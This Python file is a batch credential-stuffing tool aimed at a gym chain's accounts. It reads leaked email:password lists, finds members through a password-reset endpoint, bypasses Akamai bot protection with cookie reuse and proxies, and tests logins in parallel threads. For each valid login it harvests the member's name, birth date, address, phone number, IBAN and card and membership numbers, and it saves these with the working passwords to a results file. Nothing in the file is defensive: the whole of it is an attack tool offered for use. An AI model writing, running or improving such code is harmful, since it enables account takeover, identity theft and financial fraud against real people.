"""
Batch credential checker with pre-check, cookie reuse, and member capture.

Pipeline:
  1. Pre-check emails via password reset endpoint (no Akamai, fast)
  2. Filter to gym members only
  3. Solve Akamai + check credentials (3 per solve via cookie reuse)
  4. Capture member data for valid logins (SSO + member info)

Usage:
  python batch_checker.py <creds_file> [workers] [--no-precheck] [--no-capture]

  creds_file: one email:password per line
  workers: concurrent workers (default: 10)
"""
import json
import os
import sys
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

os.environ.setdefault("SOLVER", "jsdom")

from solver_jsdom import (
    solve_session, check_credential, cleanup_session,
    pre_check_email, _log, _make_proxy, REUSE_LIMIT, PROXY_USER,
)


def _print_member(m):
    name = f"{m.get('first_name', '?')} {m.get('last_name', '?')}"
    print(f"  Name:     {name}")
    print(f"  Club:     {m.get('home_club', '?')}")
    print(f"  Status:   {m.get('membership_status_g', '?')}")
    mtype = m.get("membership_type_g", "?")
    pp = m.get("payment_plan", {})
    if pp:
        print(f"  Plan:     {pp.get('short_description', mtype)} "
              f"- {pp.get('term_fee', '?')} EUR/{pp.get('interval', '?')}")
    else:
        print(f"  Type:     {mtype}")
    print(f"  Card:     {m.get('card_number_s', '?')}")
    print(f"  Member#:  {m.get('membership_number_s', '?')}")
    addr = ", ".join(filter(None, [
        m.get("mailing_street"), m.get("mailing_house_number"),
        m.get("poste_code"), m.get("mailing_city"), m.get("mailing_country"),
    ]))
    if addr:
        print(f"  Address:  {addr}")
    if m.get("iban"):
        print(f"  IBAN:     {m['iban']}")
    if m.get("tel_home"):
        print(f"  Phone:    {m['tel_home']}")
    if m.get("start_date_g"):
        print(f"  Joined:   {m['start_date_g'][:10]}")


def _write_member_record(f, r):
    f.write(f"{'='*60}\n")
    f.write(f"Email:    {r['email']}\n")
    f.write(f"Pass:     {r.get('password', '?')}\n")
    m = r.get("member", {})
    if not m:
        f.write("  (no member data captured)\n\n")
        return
    f.write(f"Name:     {m.get('first_name', '?')} {m.get('last_name', '?')}\n")
    f.write(f"Gender:   {m.get('gender_s', '?')}\n")
    f.write(f"Birth:    {m.get('birth_date', '?')}\n")
    f.write(f"Club:     {m.get('home_club', '?')}\n")
    f.write(f"Status:   {m.get('membership_status_g', '?')}\n")
    f.write(f"Type:     {m.get('membership_type_g', '?')}\n")
    pp = m.get("payment_plan", {})
    if pp:
        f.write(f"Plan:     {pp.get('short_description', '?')}\n")
        f.write(f"Fee:      {pp.get('term_fee', '?')} EUR / {pp.get('interval', '?')}\n")
    f.write(f"Card:     {m.get('card_number_s', '?')}\n")
    f.write(f"Member#:  {m.get('membership_number_s', '?')}\n")
    addr_parts = [m.get("mailing_street"), m.get("mailing_house_number"),
                  m.get("poste_code"), m.get("mailing_city"), m.get("mailing_country")]
    f.write(f"Address:  {', '.join(filter(None, addr_parts))}\n")
    f.write(f"IBAN:     {m.get('iban', '?')}\n")
    f.write(f"Phone:    {m.get('tel_home', '?')}\n")
    f.write(f"Joined:   {str(m.get('start_date_g', '?'))[:10]}\n")
    f.write(f"Contract: {str(m.get('contract_end_date_g', '?'))[:10]}\n")
    f.write(f"Access:   {m.get('accessType', '?')}\n")
    f.write(f"Device:   {m.get('deviceDescription', '?')}\n")
    f.write("\n")


def load_credentials(path):
    creds = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if ":" in line:
                email, password = line.split(":", 1)
                creds.append((email.strip(), password.strip()))
    return creds


def _progress_bar(current, total, members, errors, elapsed, width=40):
    pct = current / total if total else 1
    filled = int(width * pct)
    bar = "█" * filled + "░" * (width - filled)
    rate = current / elapsed if elapsed > 0 else 0
    eta = (total - current) / rate if rate > 0 else 0
    sys.stdout.write(
        f"\r  [{bar}] {current}/{total} ({pct*100:.0f}%) "
        f"| {members} members | {errors} err | {rate:.0f}/s | ETA {eta:.0f}s  "
    )
    sys.stdout.flush()


def pre_check_batch(creds, workers=50):
    total = len(creds)
    print(f"\n  Pre-checking {total} emails ({workers} threads)")
    print(f"  {'='*56}")
    t0 = time.time()
    results = {}
    lock = threading.Lock()
    counters = {"done": 0, "members": 0, "errors": 0}

    use_proxy = bool(PROXY_USER)

    def check_one(item):
        email, _ = item
        proxy_url = _make_proxy()[0] if use_proxy else None
        is_member = pre_check_email(email, proxy_url)
        with lock:
            results[email] = is_member
            counters["done"] += 1
            if is_member is True:
                counters["members"] += 1
            elif is_member is None:
                counters["errors"] += 1
            _progress_bar(counters["done"], total, counters["members"],
                          counters["errors"], time.time() - t0)

    with ThreadPoolExecutor(max_workers=workers) as pool:
        pool.map(check_one, creds)

    print()

    members = [(e, p) for e, p in creds if results.get(e) is True]
    non_members = [(e, p) for e, p in creds if results.get(e) is False]
    errors = [(e, p) for e, p in creds if results.get(e) is None]

    dt = time.time() - t0
    print(f"  Done in {dt:.1f}s: {len(members)} members, "
          f"{len(non_members)} not members, {len(errors)} errors\n")

    return members, non_members, errors


def worker(wid, batch, results_lock, results, capture=True):
    _log(f"[W{wid}] Solving for batch of {len(batch)} creds...")
    ctx = solve_session()
    if not ctx:
        _log(f"[W{wid}] Solve failed")
        with results_lock:
            for email, _ in batch:
                results.append({"email": email, "valid": None, "error": "solve failed"})
        return

    try:
        for i, (email, password) in enumerate(batch):
            if ctx["uses_left"] <= 0:
                _log(f"[W{wid}] Cookie expired, re-solving...")
                cleanup_session(ctx)
                ctx = solve_session()
                if not ctx:
                    with results_lock:
                        for em, _ in batch[i:]:
                            results.append({"email": em, "valid": None, "error": "re-solve failed"})
                    return

            _log(f"[W{wid}] Checking {email} ({ctx['uses_left']} left)...")
            result = check_credential(ctx, email, password, capture=capture)
            tag = "VALID" if result.get("valid") else str(result.get("status", "?"))
            _log(f"[W{wid}] {email} -> {tag}")

            with results_lock:
                results.append(result)
    finally:
        cleanup_session(ctx)


def batch_check(creds, workers=10, do_precheck=True, do_capture=True, precheck_threads=50):
    t_total_start = time.time()

    if do_precheck:
        members, non_members, check_errors = pre_check_batch(creds, workers=precheck_threads)
        if not members:
            _log("No gym members found, nothing to check")
            return []
        creds_to_check = members
    else:
        creds_to_check = creds

    batches = [creds_to_check[i:i + REUSE_LIMIT] for i in range(0, len(creds_to_check), REUSE_LIMIT)]
    n_solves = len(batches)
    _log(f"Checking {len(creds_to_check)} credentials: {n_solves} solves needed, {workers} workers")

    results = []
    results_lock = threading.Lock()
    t_start = time.time()

    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {}
        for i, batch in enumerate(batches):
            f = pool.submit(worker, i + 1, batch, results_lock, results, capture=do_capture)
            futures[f] = i + 1
        for f in as_completed(futures):
            try:
                f.result()
            except Exception as e:
                _log(f"Worker error: {e}")

    t_check = time.time() - t_start
    t_total = time.time() - t_total_start

    valid = [r for r in results if r.get("valid") is True]
    invalid = [r for r in results if r.get("valid") is False]
    errors = [r for r in results if r.get("valid") is None]

    print(f"\n{'='*60}")
    print(f"BATCH CHECK RESULTS")
    print(f"{'='*60}")
    if do_precheck:
        print(f"Pre-check: {len(creds)} emails -> {len(creds_to_check)} gym members")
    print(f"Checked:   {len(results)}/{len(creds_to_check)}")
    print(f"Valid:     {len(valid)}")
    print(f"Invalid:   {len(invalid)}")
    print(f"Errors:    {len(errors)}")
    print(f"Solves:    {n_solves}")
    print(f"Time:      {t_total:.1f}s total ({t_check:.1f}s checking)")
    print(f"Rate:      {len(results)/max(t_check,0.1):.1f} checks/sec")

    if valid:
        print(f"\nValid credentials:")
        for idx, r in enumerate(valid):
            if idx > 0:
                print(f"  {'-'*54}")
            print(f"  Email:    {r['email']}")
            print(f"  Pass:     {r.get('password', '?')}")
            if r.get("member"):
                _print_member(r["member"])

    if errors:
        print(f"\nErrors:")
        for r in errors:
            print(f"  {r['email']}: {r.get('error', 'unknown')}")

    if valid and do_capture:
        out_path = "results.txt"
        with open(out_path, "w", encoding="utf-8") as f:
            for r in valid:
                _write_member_record(f, r)
        _log(f"Results saved to {out_path}")

    return results


def _parse_flags():
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    flags = {}
    for f in sys.argv[1:]:
        if f.startswith("--"):
            if "=" in f:
                k, v = f.split("=", 1)
                flags[k] = v
            else:
                flags[f] = True
    return args, flags


if __name__ == "__main__":
    args, flags = _parse_flags()

    if "--proxy-user" in flags:
        os.environ["PROXY_USER"] = flags["--proxy-user"]
    if "--proxy-pass" in flags:
        os.environ["PROXY_PASS"] = flags["--proxy-pass"]

    if not args:
        print("Usage: python batch_checker.py <creds_file> [workers] [flags]")
        print("  creds_file: one email:password per line")
        print("  workers: concurrent solve workers (default: 10)")
        print(f"  Each solve is reused for {REUSE_LIMIT} credential checks")
        print("\nFlags:")
        print("  --proxy-user=USER       proxy username")
        print("  --proxy-pass=PASS       proxy password")
        print("  --no-precheck           skip gym membership pre-check")
        print("  --no-capture            skip member data capture on valid login")
        print("  --precheck-threads=N    pre-check threads (default: 50)")
        sys.exit(1)

    creds_file = args[0]
    workers = int(args[1]) if len(args) > 1 else 10
    do_precheck = "--no-precheck" not in flags
    do_capture = "--no-capture" not in flags
    precheck_threads = int(flags.get("--precheck-threads", 50))

    import importlib, solver_jsdom
    importlib.reload(solver_jsdom)
    from solver_jsdom import (
        solve_session, check_credential, cleanup_session,
        pre_check_email, _log, _make_proxy, PROXY_USER,
    )

    creds = load_credentials(creds_file)
    if not creds:
        print("No credentials found in file")
        sys.exit(1)

    batch_check(creds, workers, do_precheck=do_precheck, do_capture=do_capture,
                precheck_threads=precheck_threads)
